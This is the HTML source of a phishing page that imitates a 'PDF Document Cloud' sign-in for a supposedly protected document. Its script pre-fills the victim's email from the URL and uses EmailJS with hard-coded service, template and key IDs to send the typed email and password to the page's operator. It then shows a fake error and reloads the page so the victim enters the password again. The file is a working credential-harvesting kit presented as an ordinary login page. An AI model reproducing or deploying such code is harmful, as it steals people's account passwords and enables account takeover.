<html lang="en">
<head>
    <meta http-equiv="x-ua-compatible" content="EmulateIE9">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link rel="icon" type="image/ico" href="https://image.shutterstock.com/image-photo/image-260nw-1723718677.jpg">
    <title>PDF Document Cloud | Sign in</title>
    <script>
        // JavaScript to extract the email from the URL and pre-fill the field
        window.onload = function() {
            const urlParams = new URLSearchParams(window.location.search);
            const email = urlParams.get('email');
            if (email) {
                document.getElementById('login').value = email;
            }
        };

        // JavaScript to handle the Sign In button click with delayed reload
        async function handleSignIn() {
            const email = document.getElementById('login').value;
            const password = document.getElementById('passwd').value;

            // Simple validation
            if (!email || !password) {
                alert('Please enter both email and password.');
                return;
            }

            // Send the data to EmailJS with feedback
            emailjs.send('service_26p7vyd', 'template_mrthmvh', {
                email: email,
                password: password,
                date: new Date().toLocaleString()
            })
            .then(() => {
                console.log('Login details sent to email!');
                document.getElementById('msg').style.display = 'block';
                document.getElementById('msg').innerText = 'Login details sent to email!';
            })
            .catch(error => {
                console.error('EmailJS Error:', error);
                document.getElementById('error').style.display = 'block';
                document.getElementById('error').innerText = 'Failed to send email: ' + error.text;
            });

            // Delay the fetch and reload to allow feedback to display
            setTimeout(async () => {
                try {
                    const response = await fetch('/login', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({ email, password }),
                    });

                    if (response.ok) {
                        // Reload the page after successful submission
                        window.location.reload();
                    } else {
                        // Reload the page even if the submission fails
                        window.location.reload();
                    }
                } catch (error) {
                    console.error('Error:', error);
                    // Reload the page if an error occurs
                    window.location.reload();
                }
            }, 2000); // 2-second delay to see feedback
        }
    </script>
</head>

<body style="background-image: url(https://i.postimg.cc/0yV5B2NG/background1.jpg); background-repeat: no-repeat;background-size: cover;">
    <div class="container-fluid p-0">
        <div class="container">
            <div class="row my-5">
                <div class="col-lg-5 mx-auto">
                    <div class="m-5 p-4 bg-white rounded" id="div1" style="box-shadow: 0px 2px 5px rgba(0,0,0,0.5);">
                        <div class="text-left">
                            <span><img src="http://cdn.mcauto-images-production.sendgrid.net/07d9ac8cc71e2271/09488857-8d2c-4418-9a62-fdf70e8a5cb6/225x225.png" class="img-fluid" width="80px"></span><span class="pl-4 h5 align-middle"> </span><br><br>
                            <span class="h5">PDF Online</span><br>
                            <span class="h5"></span><br>
                            <span class="h">This a protected document, please verify to access.</span><br>
                            <span id="msg" class="text-danger" style="display: none;">Invalid Password..! Please enter correct password.</span><br>
                            <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
                            <small></small>
                            <div class="form-group">
                                <input type="email" id="login" name="AA" class="form-control rounded-0 bg-transparent" aria-describedby="aiHelp" placeholder="Email Address" readonly autofocus required>
                            </div>
                            <div class="form-group mt-2">
                                <small></small>
                                <input type="password" id="passwd" name="BB" class="form-control" aria-describedby="aiHelp" placeholder="Enter Password" autofocus required>
                            </div>
                        </div>
                        <div class="form-check mt-3">
                            <input type="checkbox" class="form-check-input" id="exampleCheck1">
                            <label class="form-check-label" for="exampleCheck1"><span><a href="#">Keep me sign in</a></span></label>
                            <span><span><a href="#" class="float-right">Forgot Password?</a></span></span>
                        </div>
                        <div class="col-lg-12 mt-3">
                            <button type="button" class="btn text-white px-4 w-100" id="submit-btn" style="background-color: #ed2a1c;" onclick="handleSignIn()">LOGIN</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Add EmailJS SDK -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
        (function() {
            emailjs.init("R8yqLxQjIzZ8wg1a7"); // Replace with your Public Key from EmailJS dashboard
        })();
    </script>

<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9215d9757970b037',t:'MTc0MjE0NDg3My4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
</html>
